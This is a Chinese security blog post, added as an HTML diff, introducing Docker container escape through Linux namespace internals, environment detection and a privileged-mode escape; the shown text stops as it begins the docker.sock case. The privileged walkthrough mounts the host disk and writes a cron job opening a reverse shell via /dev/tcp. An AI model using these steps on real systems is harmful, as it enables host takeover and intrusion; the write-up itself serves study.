@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            浅尝docker escape |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ai.jpg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">浅尝docker escape</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2023-09-30 11:10:07
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/docker-escape%EF%BC%8Cnamespace%E6%9C%BA%E5%88%B6/">docker escape，namespace机制</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>11 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期因为工作上的内容比较多压得比较紧所以一直没有去学习新的东西，也没有更新博客。所以最近呢也就挑一个比较简单一点的东西学了一下。在紧跟着的下一篇文章可能是关于<code>syzkaller</code>的，或者就是我前阵子分析的<code>Stack Rot</code>，时间多的话可能还会去更新一下<code>Rootkit</code>。</p>
+<p>这里会介绍因为配置问题引起的逃逸，但是更多的会讲解如何利用内核漏洞实现逃逸，以及通过内核漏洞实现逃逸的原理。</p>
+<h2 id="Linux-kernel-namespace机制"><a href="#Linux-kernel-namespace机制" class="headerlink" title="Linux  kernel namespace机制"></a>Linux  kernel namespace机制</h2><p><code>Linux Namespaces</code>机制提供一种资源隔离方案。PID,IPC,Network等系统资源不再是全局性的，而是属于某个特定的<code>Namespace</code>。每个<code>namespace</code>下的资源对于其他<code>namespace</code>下的资源都是透明，不可见的。因此在操作系统层面上看，就会出现多个相同pid的进程。系统中可以同时存在两个进程号为0,1,2的进程，由于属于不同的<code>namespace</code>，所以它们之间并不冲突。而在用户层面上只能看到属于用户自己<code>namespace</code>下的资源，例如使用ps命令只能列出自己<code>namespace</code>下的进程。这样每个<code>namespace</code>看上去就像一个单独的<code>Linux</code>系统。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/2015-08-06-1.jpg"
+                     
+                ></p>
+<h3 id="Linux-kernel中namespace结构体"><a href="#Linux-kernel中namespace结构体" class="headerlink" title="Linux kernel中namespace结构体"></a>Linux kernel中namespace结构体</h3><p>当前Linux支持以下八种<code>namespace</code>，具体的含义这里就不过多赘述了，网上存在很多相关资料。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uts_namespace</span> *<span class="title">uts_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ipc_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">pid_ns_for_children</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> 	     *<span class="title">net_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns_for_children</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cgroup_namespace</span> *<span class="title">cgroup_ns</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里更多关注的是<code>namespace</code>与进程之间的关系，既然这么说那么肯定是存在关系的，我们又知道的是内核中使用的是<code>task_struct</code>结构体描述当前进程的状态，那么势必在其结构体汇总存在一个成员是与<code>namespace</code>相关的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">// ... ...</span></span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>		*<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span>			<span class="title">sysvsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span>			<span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DETECT_HUNG_TASK</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>			last_switch_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>			last_switch_time;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Filesystem information: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>		*<span class="title">fs</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Open file information: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span>		*<span class="title">files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span>		*<span class="title">io_uring</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Namespaces: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>			*<span class="title">nsproxy</span>;</span></span><br><span class="line">	<span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到存在一个成员为<code>nsproxy</code>的指针，其指向的就是<code>nsproxy</code>结构体。并且相比各位应该能够注意到在<code>nsproxy</code>结构体中的<code>count</code>成员，这个成员在内核的很多结构体中都存在，一般被当作被引用的次数，那么这里的这个成员也是同样的含义。一般出现这样一个成员就代表该结构可以被多个地方使用，那么对于这里来说就是多个进程可以使用同一个<code>nsproxy</code>结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> <span class="title">init_nsproxy</span> =</span> &#123;</span><br><span class="line">	.count			= ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">	.uts_ns			= &amp;init_uts_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)</span></span><br><span class="line">	.ipc_ns			= &amp;init_ipc_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.mnt_ns			= <span class="literal">NULL</span>,</span><br><span class="line">	.pid_ns_for_children	= &amp;init_pid_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">	.net_ns			= &amp;init_net,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">	.cgroup_ns		= &amp;init_cgroup_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TIME_NS</span></span><br><span class="line">	.time_ns		= &amp;init_time_ns,</span><br><span class="line">	.time_ns_for_children	= &amp;init_time_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>然而在内核中存在一个默认的<code>nsproxy</code>，即为上面的<code>init_nsproxy</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">init_task</span></span></span><br><span class="line"><span class="class">#<span class="title">ifdef</span> <span class="title">CONFIG_ARCH_TASK_STRUCT_ON_STACK</span></span></span><br><span class="line"><span class="class">	__<span class="title">init_task_data</span></span></span><br><span class="line"><span class="class">#<span class="title">endif</span></span></span><br><span class="line"><span class="class">	__<span class="title">aligned</span>(<span class="title">L1_CACHE_BYTES</span>)</span></span><br><span class="line"><span class="class">=</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	.thread_info	= INIT_THREAD_INFO(init_task),</span><br><span class="line">	.stack_refcount	= REFCOUNT_INIT(<span class="number">1</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.__state	= <span class="number">0</span>,</span><br><span class="line">	.<span class="built_in">stack</span>		= init_stack,</span><br><span class="line">	.usage		= REFCOUNT_INIT(<span class="number">2</span>),</span><br><span class="line">	.flags		= PF_KTHREAD,</span><br><span class="line">	.prio		= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">	.static_prio	= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">	.normal_prio	= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">	.policy		= SCHED_NORMAL,</span><br><span class="line">	.cpus_ptr	= &amp;init_task.cpus_mask,</span><br><span class="line">	.user_cpus_ptr	= <span class="literal">NULL</span>,</span><br><span class="line">	.cpus_mask	= CPU_MASK_ALL,</span><br><span class="line">	.nr_cpus_allowed= NR_CPUS,</span><br><span class="line">	.mm		= <span class="literal">NULL</span>,</span><br><span class="line">	.active_mm	= &amp;init_mm,</span><br><span class="line">	.restart_block	= &#123;</span><br><span class="line">		.fn = do_no_restart_syscall,</span><br><span class="line">	&#125;,</span><br><span class="line">	.se		= &#123;</span><br><span class="line">		.group_node 	= LIST_HEAD_INIT(init_task.se.group_node),</span><br><span class="line">	&#125;,</span><br><span class="line">	.rt		= &#123;</span><br><span class="line">		.run_list	= LIST_HEAD_INIT(init_task.rt.run_list),</span><br><span class="line">		.time_slice	= RR_TIMESLICE,</span><br><span class="line">	&#125;,</span><br><span class="line">	.tasks		= LIST_HEAD_INIT(init_task.tasks),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	.pushable_tasks	= PLIST_NODE_INIT(init_task.pushable_tasks, MAX_PRIO),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_SCHED</span></span><br><span class="line">	.sched_task_group = &amp;root_task_group,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.ptraced	= LIST_HEAD_INIT(init_task.ptraced),</span><br><span class="line">	.ptrace_entry	= LIST_HEAD_INIT(init_task.ptrace_entry),</span><br><span class="line">	.real_parent	= &amp;init_task,</span><br><span class="line">	.parent		= &amp;init_task,</span><br><span class="line">	.children	= LIST_HEAD_INIT(init_task.children),</span><br><span class="line">	.sibling	= LIST_HEAD_INIT(init_task.sibling),</span><br><span class="line">	.group_leader	= &amp;init_task,</span><br><span class="line">	RCU_POINTER_INITIALIZER(real_cred, &amp;init_cred),</span><br><span class="line">	RCU_POINTER_INITIALIZER(cred, &amp;init_cred),</span><br><span class="line">	.comm		= INIT_TASK_COMM,</span><br><span class="line">	.thread		= INIT_THREAD,</span><br><span class="line">	.fs		= &amp;init_fs,</span><br><span class="line">	.files		= &amp;init_files,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line">	.io_uring	= <span class="literal">NULL</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.signal		= &amp;init_signals,</span><br><span class="line">	.sighand	= &amp;init_sighand,</span><br><span class="line">	.nsproxy	= &amp;init_nsproxy,</span><br><span class="line">	<span class="comment">// ... ...</span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(init_task);</span><br></pre></td></tr></table></figure>
+
+<p>其会被直接加载进入到<code>init_task</code>之中。</p>
+<p>在Linux系统中，PID为1的进程被称为<code>init</code>进程，系统中的所有进程都是通过<code>init</code>进程直接或者间接<code>fork</code>而来的。自然而然，宿主机上没有经过容器化的进程，他们位于同一组<code>namespace</code>中，所以会共享同一个<code>struct nsproxy</code>结构体，如下图，容器内的进程的<code>namespace</code>与其余进程不一致。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230929180710629.png"
+                      alt="image-20230929180710629"
+                ></p>
+<p>于是乎可以得出这样的结论，如果可以把容器内的<code>exp</code>进程的<code>nsproxy</code>修改为<code>init_proxy</code>就可以实现突破，达到逃逸的目的了。</p>
+<h2 id="Docker-环境判断"><a href="#Docker-环境判断" class="headerlink" title="Docker 环境判断"></a>Docker 环境判断</h2><h3 id="查找-dockerenv-文件"><a href="#查找-dockerenv-文件" class="headerlink" title="查找 .dockerenv 文件"></a>查找 .dockerenv 文件</h3><p>docker下默认存在dockerenv文件，而非docker环境中则没有</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230929182050141.png"
+                      alt="image-20230929182050141"
+                ></p>
+<h3 id="查询-cgroup-进程"><a href="#查询-cgroup-进程" class="headerlink" title="查询 cgroup 进程"></a>查询 cgroup 进程</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230929182215876.png"
+                      alt="image-20230929182215876"
+                ></p>
+<h2 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h2><h3 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h3><p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># docker run -it --privileged 镜像id /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line">Disk /dev/sda: 64 GiB, 68719476736 bytes, 134217728 sectors</span><br><span class="line">Disk model: Ubuntu Linux 20.</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 4096 bytes</span><br><span class="line">I/O size (minimum/optimal): 4096 bytes / 4096 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x1f305916</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 134215679 133163010 63.5G  5 Extended</span><br><span class="line">/dev/sda5       1052672 134215679 133163008 63.5G 83 Linux</span><br><span class="line"><span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># mkdir /test</span></span><br><span class="line">root@7fbc86e39373:~<span class="comment"># mount /dev/sda5 /test</span></span><br></pre></td></tr></table></figure>
+
+<p>最终写入计划任务到宿主机实现反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27;</span> &gt;&gt; /<span class="built_in">test</span>/var/spool/cron/root</span><br></pre></td></tr></table></figure>
+
+<h3 id="如何判断是否为特权模式"><a href="#如何判断是否为特权模式" class="headerlink" title="如何判断是否为特权模式"></a>如何判断是否为特权模式</h3><p>在suid提权中SUID设置的程序出现漏洞就非常容易被利用，所以 Linux 引入了 Capability 机制以此来实现更加细致的权限控制，从而增加系统的安全性。</p>
+<p>在 <a class="link"   target="_blank" rel="noopener" href="https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md" >https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md<i class="fas fa-external-link-alt"></i></a> 链接中汇总了特权模式下添加了什么功能。</p>
+<p>除此之外还需具有以下条件</p>
+<ul>
+<li>  必须缺少AppArmor配置文件，否则将允许mount syscall</li>
+<li>  能够“看到”很多敏感的dev设备</li>
+</ul>
+<p>上述两个条件目前还不知道如何获取，所以重点看下特权容器中获取的 Cap 集合</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	000001ffffffffff</span><br><span class="line">CapEff:	000001ffffffffff</span><br><span class="line">CapBnd:	000001ffffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>CapEff 主要是检查线程的执行权限，所以重点看下利用 <code>capsh --decode=0000001fffffffff</code> 进行解码，检索默认没有添加的 NET_ADMIN，发现存在<code>cap_net_admin</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~/<span class="built_in">test</span><span class="comment"># capsh --decode=0000001fffffffff</span></span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span><br></pre></td></tr></table></figure>
+
+<p>而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN</p>
+<h3 id="docker-sock-挂载逃逸"><a href="#docker-sock-挂载逃逸" class="headerlink" title="docker.sock 挂载逃逸"></a>docker.sock 挂载逃逸</h3><p>Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon(docker守护进程)扮演，二者之间通信方式有以下3种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unix:///var/run/docker.sock</span><br><span class="line">tcp://host:port</span><br><span class="line">fd://socketfd</span><br></pre></td></tr></table></figure>
+
